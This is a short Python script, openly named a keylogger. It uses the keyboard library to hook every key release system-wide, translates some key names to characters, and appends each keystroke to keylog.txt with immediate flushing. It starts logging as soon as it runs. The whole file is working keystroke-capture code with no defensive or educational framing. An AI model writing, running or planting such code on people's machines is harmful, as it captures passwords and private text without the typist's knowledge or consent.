import keyboard

class keylogger:
    def __init__(self, log_filename):
        self.f = open(log_filename, "w")
    def start_log(self):
        keyboard.on_release(callback = self.callback)
        keyboard.wait()
    def callback(self, event):
        button = event.name
        if button == "space":
            button = " "
        elif button == "shift1":
            button = "!"
        elif button == "shift2":
            button = "@"
        elif button == "shift3":
            button = "#"
        elif button == "shift4":
            button = "$"
        elif button == "shift5":
            button = "%"
        elif button == "shift6":
            button = "^"
        elif button == "shift7":
            button = "&"
        elif button == "shift8":
            button = "*"
        elif button == "shift9":
            button = "("
        elif button == "shift0":
            button = ")"
        elif button == "shift-":
            button = "_"
        elif button == "shift=":
            button = "+"
        elif button == "backspace":
            button = ""
        self.f.write(button)
        self.f.flush()



keyboard_object = keylogger("keylog.txt")
keyboard_object.start_log()

